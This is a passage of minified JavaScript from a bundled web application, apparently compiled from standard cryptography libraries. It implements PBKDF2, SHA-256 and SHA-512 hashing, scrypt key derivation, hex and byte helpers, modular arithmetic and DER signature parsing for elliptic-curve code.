                u = new Uint8Array(a),
                d = Ql.create(e, c),
                f = d._cloneInto().update(l);
            return {
                c: o,
                dkLen: a,
                asyncTick: s,
                DK: u,
                PRF: d,
                PRFSalt: f
            }
        }

        function Vl(e, t, n, r, i) {
            return e.destroy(), t.destroy(), r && r.destroy(), i.fill(0), n
        }

        function Zl(e, t, n, r) {
            const {
                c: i,
                dkLen: o,
                DK: a,
                PRF: s,
                PRFSalt: c
            } = Wl(e, t, n, r);
            let l;
            const u = new Uint8Array(4),
                d = Mr(u),
                f = new Uint8Array(s.outputLen);
            for (let h = 1, p = 0; p < o; h++, p += s.outputLen) {
                const e = a.subarray(p, p + s.outputLen);
                d.setInt32(0, h, !1), (l = c._cloneInto(l)).update(u).digestInto(f), e.set(f.subarray(0, e.length));
                for (let t = 1; t < i; t++) {
                    s._cloneInto(l).update(f).digestInto(f);
                    for (let t = 0; t < e.length; t++) e[t] ^= f[t]
                }
            }
            return Vl(s, c, a, l, f)
        }
        Ql.create = (e, t) => new ql(e, t);
        class Kl extends Hr {
            constructor(e, t, n, r) {
                super(), this.blockLen = e, this.outputLen = t, this.padOffset = n, this.isLE = r, this.finished = !1, this.length = 0, this.pos = 0, this.destroyed = !1, this.buffer = new Uint8Array(e), this.view = Mr(this.buffer)
            }
            update(e) {
                yr(this);
                const {
                    view: t,
                    buffer: n,
                    blockLen: r
                } = this, i = (e = Lr(e)).length;
                for (let o = 0; o < i;) {
                    const a = Math.min(r - this.pos, i - o);
                    if (a !== r) n.set(e.subarray(o, o + a), this.pos), this.pos += a, o += a, this.pos === r && (this.process(t, 0), this.pos = 0);
                    else {
                        const t = Mr(e);
                        for (; r <= i - o; o += r) this.process(t, o)
                    }
                }
                return this.length += e.length, this.roundClean(), this
            }
            digestInto(e) {
                yr(this), br(e, this), this.finished = !0;
                const {
                    buffer: t,
                    view: n,
                    blockLen: r,
                    isLE: i
                } = this;
                let {
                    pos: o
                } = this;
                t[o++] = 128, this.buffer.subarray(o).fill(0), this.padOffset > r - o && (this.process(n, 0), o = 0);
                for (let u = o; u < r; u++) t[u] = 0;
                ! function(e, t, n, r) {
                    if ("function" === typeof e.setBigUint64) return e.setBigUint64(t, n, r);
                    const i = BigInt(32),
                        o = BigInt(4294967295),
                        a = Number(n >> i & o),
                        s = Number(n & o),
                        c = r ? 4 : 0,
                        l = r ? 0 : 4;
                    e.setUint32(t + c, a, r), e.setUint32(t + l, s, r)
                }(n, r - 8, BigInt(8 * this.length), i), this.process(n, 0);
                const a = Mr(e),
                    s = this.outputLen;
                if (s % 4) throw new Error("_sha2: outputLen should be aligned to 32bit");
                const c = s / 4,
                    l = this.get();
                if (c > l.length) throw new Error("_sha2: outputLen bigger than state");
                for (let u = 0; u < c; u++) a.setUint32(4 * u, l[u], i)
            }
            digest() {
                const {
                    buffer: e,
                    outputLen: t
                } = this;
                this.digestInto(e);
                const n = e.slice(0, t);
                return this.destroy(), n
            }
            _cloneInto(e) {
                e || (e = new this.constructor), e.set(...this.get());
                const {
                    blockLen: t,
                    buffer: n,
                    length: r,
                    finished: i,
                    destroyed: o,
                    pos: a
                } = this;
                return e.length = r, e.pos = a, e.finished = i, e.destroyed = o, r % t && e.buffer.set(n), e
            }
        }
        const Jl = (e, t, n) => e & t ^ ~e & n,
            Yl = (e, t, n) => e & t ^ e & n ^ t & n,
            Xl = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298]),
            $l = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225]),
            eu = new Uint32Array(64);
        class tu extends Kl {
            constructor() {
                super(64, 32, 8, !1), this.A = 0 | $l[0], this.B = 0 | $l[1], this.C = 0 | $l[2], this.D = 0 | $l[3], this.E = 0 | $l[4], this.F = 0 | $l[5], this.G = 0 | $l[6], this.H = 0 | $l[7]
            }
            get() {
                const {
                    A: e,
                    B: t,
                    C: n,
                    D: r,
                    E: i,
                    F: o,
                    G: a,
                    H: s
                } = this;
                return [e, t, n, r, i, o, a, s]
            }
            set(e, t, n, r, i, o, a, s) {
                this.A = 0 | e, this.B = 0 | t, this.C = 0 | n, this.D = 0 | r, this.E = 0 | i, this.F = 0 | o, this.G = 0 | a, this.H = 0 | s
            }
            process(e, t) {
                for (let u = 0; u < 16; u++, t += 4) eu[u] = e.getUint32(t, !1);
                for (let u = 16; u < 64; u++) {
                    const e = eu[u - 15],
                        t = eu[u - 2],
                        n = jr(e, 7) ^ jr(e, 18) ^ e >>> 3,
                        r = jr(t, 17) ^ jr(t, 19) ^ t >>> 10;
                    eu[u] = r + eu[u - 7] + n + eu[u - 16] | 0
                }
                let {
                    A: n,
                    B: r,
                    C: i,
                    D: o,
                    E: a,
                    F: s,
                    G: c,
                    H: l
                } = this;
                for (let u = 0; u < 64; u++) {
                    const e = l + (jr(a, 6) ^ jr(a, 11) ^ jr(a, 25)) + Jl(a, s, c) + Xl[u] + eu[u] | 0,
                        t = (jr(n, 2) ^ jr(n, 13) ^ jr(n, 22)) + Yl(n, r, i) | 0;
                    l = c, c = s, s = a, a = o + e | 0, o = i, i = r, r = n, n = e + t | 0
                }
                n = n + this.A | 0, r = r + this.B | 0, i = i + this.C | 0, o = o + this.D | 0, a = a + this.E | 0, s = s + this.F | 0, c = c + this.G | 0, l = l + this.H | 0, this.set(n, r, i, o, a, s, c, l)
            }
            roundClean() {
                eu.fill(0)
            }
            destroy() {
                this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0)
            }
        }
        const nu = Gr((() => new tu)),
            [ru, iu] = (() => Br.split(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map((e => BigInt(e)))))(),
            ou = new Uint32Array(80),
            au = new Uint32Array(80);
        class su extends Kl {
            constructor() {
                super(128, 64, 16, !1), this.Ah = 1779033703, this.Al = -205731576, this.Bh = -1150833019, this.Bl = -2067093701, this.Ch = 1013904242, this.Cl = -23791573, this.Dh = -1521486534, this.Dl = 1595750129, this.Eh = 1359893119, this.El = -1377402159, this.Fh = -1694144372, this.Fl = 725511199, this.Gh = 528734635, this.Gl = -79577749, this.Hh = 1541459225, this.Hl = 327033209
            }
            get() {
                const {
                    Ah: e,
                    Al: t,
                    Bh: n,
                    Bl: r,
                    Ch: i,
                    Cl: o,
                    Dh: a,
                    Dl: s,
                    Eh: c,
                    El: l,
                    Fh: u,
                    Fl: d,
                    Gh: f,
                    Gl: h,
                    Hh: p,
                    Hl: m
                } = this;
                return [e, t, n, r, i, o, a, s, c, l, u, d, f, h, p, m]
            }
            set(e, t, n, r, i, o, a, s, c, l, u, d, f, h, p, m) {
                this.Ah = 0 | e, this.Al = 0 | t, this.Bh = 0 | n, this.Bl = 0 | r, this.Ch = 0 | i, this.Cl = 0 | o, this.Dh = 0 | a, this.Dl = 0 | s, this.Eh = 0 | c, this.El = 0 | l, this.Fh = 0 | u, this.Fl = 0 | d, this.Gh = 0 | f, this.Gl = 0 | h, this.Hh = 0 | p, this.Hl = 0 | m
            }
            process(e, t) {
                for (let y = 0; y < 16; y++, t += 4) ou[y] = e.getUint32(t), au[y] = e.getUint32(t += 4);
                for (let y = 16; y < 80; y++) {
                    const e = 0 | ou[y - 15],
                        t = 0 | au[y - 15],
                        n = Br.rotrSH(e, t, 1) ^ Br.rotrSH(e, t, 8) ^ Br.shrSH(e, t, 7),
                        r = Br.rotrSL(e, t, 1) ^ Br.rotrSL(e, t, 8) ^ Br.shrSL(e, t, 7),
                        i = 0 | ou[y - 2],
                        o = 0 | au[y - 2],
                        a = Br.rotrSH(i, o, 19) ^ Br.rotrBH(i, o, 61) ^ Br.shrSH(i, o, 6),
                        s = Br.rotrSL(i, o, 19) ^ Br.rotrBL(i, o, 61) ^ Br.shrSL(i, o, 6),
                        c = Br.add4L(r, s, au[y - 7], au[y - 16]),
                        l = Br.add4H(c, n, a, ou[y - 7], ou[y - 16]);
                    ou[y] = 0 | l, au[y] = 0 | c
                }
                let {
                    Ah: n,
                    Al: r,
                    Bh: i,
                    Bl: o,
                    Ch: a,
                    Cl: s,
                    Dh: c,
                    Dl: l,
                    Eh: u,
                    El: d,
                    Fh: f,
                    Fl: h,
                    Gh: p,
                    Gl: m,
                    Hh: g,
                    Hl: v
                } = this;
                for (let y = 0; y < 80; y++) {
                    const e = Br.rotrSH(u, d, 14) ^ Br.rotrSH(u, d, 18) ^ Br.rotrBH(u, d, 41),
                        t = Br.rotrSL(u, d, 14) ^ Br.rotrSL(u, d, 18) ^ Br.rotrBL(u, d, 41),
                        b = u & f ^ ~u & p,
                        w = d & h ^ ~d & m,
                        x = Br.add5L(v, t, w, iu[y], au[y]),
                        A = Br.add5H(x, g, e, b, ru[y], ou[y]),
                        k = 0 | x,
                        E = Br.rotrSH(n, r, 28) ^ Br.rotrBH(n, r, 34) ^ Br.rotrBH(n, r, 39),
                        S = Br.rotrSL(n, r, 28) ^ Br.rotrBL(n, r, 34) ^ Br.rotrBL(n, r, 39),
                        C = n & i ^ n & a ^ i & a,
                        _ = r & o ^ r & s ^ o & s;
                    g = 0 | p, v = 0 | m, p = 0 | f, m = 0 | h, f = 0 | u, h = 0 | d, ({
                        h: u,
                        l: d
                    } = Br.add(0 | c, 0 | l, 0 | A, 0 | k)), c = 0 | a, l = 0 | s, a = 0 | i, s = 0 | o, i = 0 | n, o = 0 | r;
                    const I = Br.add3L(k, S, _);
                    n = Br.add3H(I, A, E, C), r = 0 | I
                }({
                    h: n,
                    l: r
                } = Br.add(0 | this.Ah, 0 | this.Al, 0 | n, 0 | r)), ({
                    h: i,
                    l: o
                } = Br.add(0 | this.Bh, 0 | this.Bl, 0 | i, 0 | o)), ({
                    h: a,
                    l: s
                } = Br.add(0 | this.Ch, 0 | this.Cl, 0 | a, 0 | s)), ({
                    h: c,
                    l: l
                } = Br.add(0 | this.Dh, 0 | this.Dl, 0 | c, 0 | l)), ({
                    h: u,
                    l: d
                } = Br.add(0 | this.Eh, 0 | this.El, 0 | u, 0 | d)), ({
                    h: f,
                    l: h
                } = Br.add(0 | this.Fh, 0 | this.Fl, 0 | f, 0 | h)), ({
                    h: p,
                    l: m
                } = Br.add(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | m)), ({
                    h: g,
                    l: v
                } = Br.add(0 | this.Hh, 0 | this.Hl, 0 | g, 0 | v)), this.set(n, r, i, o, a, s, c, l, u, d, f, h, p, m, g, v)
            }
            roundClean() {
                ou.fill(0), au.fill(0)
            }
            destroy() {
                this.buffer.fill(0), this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
            }
        }
        const cu = Gr((() => new su));

        function lu(e, t, n, r, i) {
            if (!["sha256", "sha512"].includes(i)) throw new Error("Only sha256 and sha512 are supported");
            return ui(e), ui(t), Zl("sha256" === i ? nu : cu, e, t, {
                c: n,
                dkLen: r
            })
        }
        const uu = (e, t) => e << t | e >>> 32 - t;

        function du(e, t, n, r, i, o) {
            let a = e[t++] ^ n[r++],
                s = e[t++] ^ n[r++],
                c = e[t++] ^ n[r++],
                l = e[t++] ^ n[r++],
                u = e[t++] ^ n[r++],
                d = e[t++] ^ n[r++],
                f = e[t++] ^ n[r++],
                h = e[t++] ^ n[r++],
                p = e[t++] ^ n[r++],
                m = e[t++] ^ n[r++],
                g = e[t++] ^ n[r++],
                v = e[t++] ^ n[r++],
                y = e[t++] ^ n[r++],
                b = e[t++] ^ n[r++],
                w = e[t++] ^ n[r++],
                x = e[t++] ^ n[r++],
                A = a,
                k = s,
                E = c,
                S = l,
                C = u,
                _ = d,
                I = f,
                P = h,
                T = p,
                B = m,
                N = g,
                O = v,
                R = y,
                M = b,
                j = w,
                F = x;
            for (let L = 0; L < 8; L += 2) C ^= uu(A + R | 0, 7), T ^= uu(C + A | 0, 9), R ^= uu(T + C | 0, 13), A ^= uu(R + T | 0, 18), B ^= uu(_ + k | 0, 7), M ^= uu(B + _ | 0, 9), k ^= uu(M + B | 0, 13), _ ^= uu(k + M | 0, 18), j ^= uu(N + I | 0, 7), E ^= uu(j + N | 0, 9), I ^= uu(E + j | 0, 13), N ^= uu(I + E | 0, 18), S ^= uu(F + O | 0, 7), P ^= uu(S + F | 0, 9), O ^= uu(P + S | 0, 13), F ^= uu(O + P | 0, 18), k ^= uu(A + S | 0, 7), E ^= uu(k + A | 0, 9), S ^= uu(E + k | 0, 13), A ^= uu(S + E | 0, 18), I ^= uu(_ + C | 0, 7), P ^= uu(I + _ | 0, 9), C ^= uu(P + I | 0, 13), _ ^= uu(C + P | 0, 18), O ^= uu(N + B | 0, 7), T ^= uu(O + N | 0, 9), B ^= uu(T + O | 0, 13), N ^= uu(B + T | 0, 18), R ^= uu(F + j | 0, 7), M ^= uu(R + F | 0, 9), j ^= uu(M + R | 0, 13), F ^= uu(j + M | 0, 18);
            i[o++] = a + A | 0, i[o++] = s + k | 0, i[o++] = c + E | 0, i[o++] = l + S | 0, i[o++] = u + C | 0, i[o++] = d + _ | 0, i[o++] = f + I | 0, i[o++] = h + P | 0, i[o++] = p + T | 0, i[o++] = m + B | 0, i[o++] = g + N | 0, i[o++] = v + O | 0, i[o++] = y + R | 0, i[o++] = b + M | 0, i[o++] = w + j | 0, i[o++] = x + F | 0
        }

        function fu(e, t, n, r, i) {
            let o = r + 0,
                a = r + 16 * i;
            for (let s = 0; s < 16; s++) n[a + s] = e[t + 16 * (2 * i - 1) + s];
            for (let s = 0; s < i; s++, o += 16, t += 16) du(n, a, e, t, n, o), s > 0 && (a += 16), du(n, o, e, t += 16, n, a)
        }

        function hu(e, t, n) {
            const r = zr({
                    dkLen: 32,
                    asyncTick: 10,
                    maxmem: 1073742848
                }, n),
                {
                    N: i,
                    r: o,
                    p: a,
                    dkLen: s,
                    asyncTick: c,
                    maxmem: l,
                    onProgress: u
                } = r;
            if (mr(i), mr(o), mr(a), mr(s), mr(c), mr(l), void 0 !== u && "function" !== typeof u) throw new Error("progressCb should be function");
            const d = 128 * o,
                f = d / 4;
            if (i <= 1 || 0 !== (i & i - 1) || i >= 2 ** (d / 8) || i > 2 ** 32) throw new Error("Scrypt: N must be larger than 1, a power of 2, less than 2^(128 * r / 8) and less than 2^32");
            if (a < 0 || a > 137438953440 / d) throw new Error("Scrypt: p must be a positive integer less than or equal to ((2^32 - 1) * 32) / (128 * r)");
            if (s < 0 || s > 137438953440) throw new Error("Scrypt: dkLen should be positive integer less than or equal to (2^32 - 1) * 32");
            const h = d * (i + a);
            if (h > l) throw new Error("Scrypt: parameters too large, ".concat(h, " (128 * r * (N + p)) > ").concat(l, " (maxmem)"));
            const p = Zl(nu, e, t, {
                    c: 1,
                    dkLen: d * a
                }),
                m = Or(p),
                g = Or(new Uint8Array(d * i)),
                v = Or(new Uint8Array(d));
            let y = () => {};
            if (u) {
                const e = 2 * i * a,
                    t = Math.max(Math.floor(e / 1e4), 1);
                let n = 0;
                y = () => {
                    n++, !u || n % t && n !== e || u(n / e)
                }
            }
            return {
                N: i,
                r: o,
                p: a,
                dkLen: s,
                blockSize32: f,
                V: g,
                B32: m,
                B: p,
                tmp: v,
                blockMixCb: y,
                asyncTick: c
            }
        }

        function pu(e, t, n, r, i) {
            const o = Zl(nu, e, n, {
                c: 1,
                dkLen: t
            });
            return n.fill(0), r.fill(0), i.fill(0), o
        }

        function mu(e, t, n, r, i, o, a) {
            return ui(e), ui(t),
                function(e, t, n) {
                    const {
                        N: r,
                        r: i,
                        p: o,
                        dkLen: a,
                        blockSize32: s,
                        V: c,
                        B32: l,
                        B: u,
                        tmp: d,
                        blockMixCb: f
                    } = hu(e, t, n);
                    for (let h = 0; h < o; h++) {
                        const e = s * h;
                        for (let t = 0; t < s; t++) c[t] = l[e + t];
                        for (let t = 0, n = 0; t < r - 1; t++) fu(c, n, c, n += s, i), f();
                        fu(c, (r - 1) * s, l, e, i), f();
                        for (let t = 0; t < r; t++) {
                            const t = l[e + s - 16] % r;
                            for (let n = 0; n < s; n++) d[n] = l[e + n] ^ c[t * s + n];
                            fu(d, 0, l, e, i), f()
                        }
                    }
                    return pu(e, a, u, c, d)
                }(e, t, {
                    N: n,
                    r: i,
                    p: r,
                    dkLen: o,
                    onProgress: a
                })
        }
        BigInt(0);
        const gu = BigInt(1),
            vu = BigInt(2);

        function yu(e) {
            return e instanceof Uint8Array || null != e && "object" === typeof e && "Uint8Array" === e.constructor.name
        }
        const bu = Array.from({
            length: 256
        }, ((e, t) => t.toString(16).padStart(2, "0")));

        function wu(e) {
            if (!yu(e)) throw new Error("Uint8Array expected");
            let t = "";
            for (let n = 0; n < e.length; n++) t += bu[e[n]];
            return t
        }

        function xu(e) {
            if ("string" !== typeof e) throw new Error("hex string expected, got " + typeof e);
            return BigInt("" === e ? "0" : "0x".concat(e))
        }
        const Au = {
            _0: 48,
            _9: 57,
            _A: 65,
            _F: 70,
            _a: 97,
            _f: 102
        };

        function ku(e) {
            return e >= Au._0 && e <= Au._9 ? e - Au._0 : e >= Au._A && e <= Au._F ? e - (Au._A - 10) : e >= Au._a && e <= Au._f ? e - (Au._a - 10) : void 0
        }

        function Eu(e) {
            if ("string" !== typeof e) throw new Error("hex string expected, got " + typeof e);
            const t = e.length,
                n = t / 2;
            if (t % 2) throw new Error("padded hex string expected, got unpadded hex of length " + t);
            const r = new Uint8Array(n);
            for (let i = 0, o = 0; i < n; i++, o += 2) {
                const t = ku(e.charCodeAt(o)),
                    n = ku(e.charCodeAt(o + 1));
                if (void 0 === t || void 0 === n) {
                    const t = e[o] + e[o + 1];
                    throw new Error('hex string expected, got non-hex character "' + t + '" at index ' + o)
                }
                r[i] = 16 * t + n
            }
            return r
        }

        function Su(e) {
            return xu(wu(e))
        }

        function Cu(e) {
            if (!yu(e)) throw new Error("Uint8Array expected");
            return xu(wu(Uint8Array.from(e).reverse()))
        }

        function _u(e, t) {
            return Eu(e.toString(16).padStart(2 * t, "0"))
        }

        function Iu(e, t) {
            return _u(e, t).reverse()
        }

        function Pu(e, t, n) {
            let r;
            if ("string" === typeof t) try {
                r = Eu(t)
            } catch (Qy) {
                throw new Error("".concat(e, ' must be valid hex string, got "').concat(t, '". Cause: ').concat(Qy))
            } else {
                if (!yu(t)) throw new Error("".concat(e, " must be hex string or Uint8Array"));
                r = Uint8Array.from(t)
            }
            const i = r.length;
            if ("number" === typeof n && i !== n) throw new Error("".concat(e, " expected ").concat(n, " bytes, got ").concat(i));
            return r
        }

        function Tu() {
            let e = 0;
            for (let r = 0; r < arguments.length; r++) {
                const t = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                if (!yu(t)) throw new Error("Uint8Array expected");
                e += t.length
            }
            let t = new Uint8Array(e),
                n = 0;
            for (let r = 0; r < arguments.length; r++) {
                const e = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                t.set(e, n), n += e.length
            }
            return t
        }
        const Bu = e => (vu << BigInt(e - 1)) - gu,
            Nu = e => new Uint8Array(e),
            Ou = e => Uint8Array.from(e);

        function Ru(e, t, n) {
            if ("number" !== typeof e || e < 2) throw new Error("hashLen must be a number");
            if ("number" !== typeof t || t < 2) throw new Error("qByteLen must be a number");
            if ("function" !== typeof n) throw new Error("hmacFn must be a function");
            let r = Nu(e),
                i = Nu(e),
                o = 0;
            const a = () => {
                    r.fill(1), i.fill(0), o = 0
                },
                s = function() {
                    for (var e = arguments.length, t = new Array(e), o = 0; o < e; o++) t[o] = arguments[o];
                    return n(i, r, ...t)
                },
                c = function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Nu();
                    i = s(Ou([0]), e), r = s(), 0 !== e.length && (i = s(Ou([1]), e), r = s())
                },
                l = () => {
                    if (o++ >= 1e3) throw new Error("drbg: tried 1000 values");
                    let e = 0;
                    const n = [];
                    for (; e < t;) {
                        r = s();
                        const t = r.slice();
                        n.push(t), e += r.length
                    }
                    return Tu(...n)
                };
            return (e, t) => {
                let n;
                for (a(), c(e); !(n = t(l()));) c();
                return a(), n
            }
        }
        const Mu = {
            bigint: e => "bigint" === typeof e,
            function: e => "function" === typeof e,
            boolean: e => "boolean" === typeof e,
            string: e => "string" === typeof e,
            stringOrUint8Array: e => "string" === typeof e || yu(e),
            isSafeInteger: e => Number.isSafeInteger(e),
            array: e => Array.isArray(e),
            field: (e, t) => t.Fp.isValid(e),
            hash: e => "function" === typeof e && Number.isSafeInteger(e.outputLen)
        };

        function ju(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            const r = (t, n, r) => {
                const i = Mu[n];
                if ("function" !== typeof i) throw new Error('Invalid validator "'.concat(n, '", expected function'));
                const o = e[t];
                if ((!r || void 0 !== o) && !i(o, e)) throw new Error("Invalid param ".concat(String(t), "=").concat(o, " (").concat(typeof o, "), expected ").concat(n))
            };
            for (const [i, o] of Object.entries(t)) r(i, o, !1);
            for (const [i, o] of Object.entries(n)) r(i, o, !0);
            return e
        }
        const Fu = BigInt(0),
            Lu = BigInt(1),
            Du = BigInt(2),
            Hu = BigInt(3),
            Uu = BigInt(4),
            zu = BigInt(5),
            Gu = BigInt(8);
        BigInt(9), BigInt(16);

        function qu(e, t) {
            const n = e % t;
            return n >= Fu ? n : t + n
        }

        function Qu(e, t, n) {
            if (n <= Fu || t < Fu) throw new Error("Expected power/modulo > 0");
            if (n === Lu) return Fu;
            let r = Lu;
            for (; t > Fu;) t & Lu && (r = r * e % n), e = e * e % n, t >>= Lu;
            return r
        }

        function Wu(e, t, n) {
            let r = e;
            for (; t-- > Fu;) r *= r, r %= n;
            return r
        }

        function Vu(e, t) {
            if (e === Fu || t <= Fu) throw new Error("invert: expected positive integers, got n=".concat(e, " mod=").concat(t));
            let n = qu(e, t),
                r = t,
                i = Fu,
                o = Lu,
                a = Lu,
                s = Fu;
            for (; n !== Fu;) {
                const e = r / n,
                    t = r % n,
                    c = i - a * e,
                    l = o - s * e;
                r = n, n = t, i = a, o = s, a = c, s = l
            }
            if (r !== Lu) throw new Error("invert: does not exist");
            return qu(i, t)
        }

        function Zu(e) {
            if (e % Uu === Hu) {
                const t = (e + Lu) / Uu;
                return function(e, n) {
                    const r = e.pow(n, t);
                    if (!e.eql(e.sqr(r), n)) throw new Error("Cannot find square root");
                    return r
                }
            }
            if (e % Gu === zu) {
                const t = (e - zu) / Gu;
                return function(e, n) {
                    const r = e.mul(n, Du),
                        i = e.pow(r, t),
                        o = e.mul(n, i),
                        a = e.mul(e.mul(o, Du), i),
                        s = e.mul(o, e.sub(a, e.ONE));
                    if (!e.eql(e.sqr(s), n)) throw new Error("Cannot find square root");
                    return s
                }
            }
            return function(e) {
                const t = (e - Lu) / Du;
                let n, r, i;
                for (n = e - Lu, r = 0; n % Du === Fu; n /= Du, r++);
                for (i = Du; i < e && Qu(i, t, e) !== e - Lu; i++);
                if (1 === r) {
                    const t = (e + Lu) / Uu;
                    return function(e, n) {
                        const r = e.pow(n, t);
                        if (!e.eql(e.sqr(r), n)) throw new Error("Cannot find square root");
                        return r
                    }
                }
                const o = (n + Lu) / Du;
                return function(e, a) {
                    if (e.pow(a, t) === e.neg(e.ONE)) throw new Error("Cannot find square root");
                    let s = r,
                        c = e.pow(e.mul(e.ONE, i), n),
                        l = e.pow(a, o),
                        u = e.pow(a, n);
                    for (; !e.eql(u, e.ONE);) {
                        if (e.eql(u, e.ZERO)) return e.ZERO;
                        let t = 1;
                        for (let r = e.sqr(u); t < s && !e.eql(r, e.ONE); t++) r = e.sqr(r);
                        const n = e.pow(c, Lu << BigInt(s - t - 1));
                        c = e.sqr(n), l = e.mul(l, n), u = e.mul(u, c), s = t
                    }
                    return l
                }
            }(e)
        }
        const Ku = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];

        function Ju(e, t) {
            const n = void 0 !== t ? t : e.toString(2).length;
            return {
                nBitLength: n,
                nByteLength: Math.ceil(n / 8)
            }
        }

        function Yu(e) {
            if ("bigint" !== typeof e) throw new Error("field order must be bigint");
            const t = e.toString(2).length;
            return Math.ceil(t / 8)
        }

        function Xu(e) {
            const t = Yu(e);
            return t + Math.ceil(t / 2)
        }
        const $u = BigInt(0),
            ed = BigInt(1);

        function td(e) {
            return ju(e.Fp, Ku.reduce(((e, t) => (e[t] = "function", e)), {
                ORDER: "bigint",
                MASK: "bigint",
                BYTES: "isSafeInteger",
                BITS: "isSafeInteger"
            })), ju(e, {
                n: "bigint",
                h: "bigint",
                Gx: "field",
                Gy: "field"
            }, {
                nBitLength: "isSafeInteger",
                nByteLength: "isSafeInteger"
            }), Object.freeze({ ...Ju(e.n, e.nBitLength),
                ...e,
                p: e.Fp.ORDER
            })
        }
        const {
            bytesToNumberBE: nd,
            hexToBytes: rd
        } = i, id = {
            Err: class extends Error {
                constructor() {
                    super(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "")
                }
            },
            _parseInt(e) {
                const {
                    Err: t
                } = id;
                if (e.length < 2 || 2 !== e[0]) throw new t("Invalid signature integer tag");
                const n = e[1],
                    r = e.subarray(2, n + 2);
                if (!n || r.length !== n) throw new t("Invalid signature integer: wrong length");
                if (128 & r[0]) throw new t("Invalid signature integer: negative");
                if (0 === r[0] && !(128 & r[1])) throw new t("Invalid signature integer: unnecessary leading zero");
                return {
                    d: nd(r),
                    l: e.subarray(n + 2)
                }
            },
            toSig(e) {
                const {
                    Err: t
                } = id, n = "string" === typeof e ? rd(e) : e;
                if (!yu(n)) throw new Error("ui8a expected");
                let r = n.length;
                if (r < 2 || 48 != n[0]) throw new t("Invalid signature tag");
                if (n[1] !== r - 2) throw new t("Invalid signature: incorrect length");
                const {
                    d: i,
                    l: o
                } = id._parseInt(n.subarray(2)), {
                    d: a,
                    l: s
                } = id._parseInt(o);
                if (s.length) throw new t("Invalid signature: left bytes after parsing");
                return {
                    r: i,
                    s: a
                }
            },
            hexFromSig(e) {
                const t = e => 8 & Number.parseInt(e[0], 16) ? "00" + e : e,
                    n = e => {
                        const t = e.toString(16);
                        return 1 & t.length ? "0".concat(t) : t
                    },
                    r = t(n(e.s)),
                    i = t(n(e.r)),
                    o = r.length / 2,
                    a = i.length / 2,
                    s = n(o),
                    c = n(a);
                return "30".concat(n(a + o + 4), "02").concat(c).concat(i, "02").concat(s).concat(r)
            }
        }, od = BigInt(0), ad = BigInt(1), sd = (BigInt(2), BigInt(3));
        BigInt(4);

        function cd(e) {
            const t = function(e) {
                    const t = td(e);
                    ju(t, {
                        a: "field",
                        b: "field"
                    }, {
                        allowedPrivateKeyLengths: "array",
                        wrapPrivateKey: "boolean",
                        isTorsionFree: "function",
                        clearCofactor: "function",
                        allowInfinityPoint: "boolean",
                        fromBytes: "function",
                        toBytes: "function"
                    });
                    const {
                        endo: n,
                        Fp: r,
                        a: i
                    } = t;
                    if (n) {
